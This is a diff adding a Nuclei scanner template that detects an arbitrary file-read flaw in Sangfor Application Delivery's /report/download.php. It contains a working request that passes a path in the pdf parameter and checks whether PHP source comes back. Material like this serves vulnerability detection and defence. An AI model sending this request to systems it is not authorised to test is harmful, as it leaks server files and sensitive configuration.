@@ -1,0 +1,25 @@
+id: sangfor-ad-download-file-read
+info:
+  name: Sangfor AD download.php pdf file reading vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Sangfor Application Delivery AD has an arbitrary file reading vulnerability in the `/report/download.php` file. By passing in the `pdf` parameter, an attacker can download any file in the server, potentially leaking sensitive information like system configuration or database files.
+  tags: file-read
+  reference:
+    - https://www.sangfor.com.cn
+
+http:
+  - raw:
+      - |
+        GET /report/download.php?pdf=./download.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Nuclei
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "<\\?php"
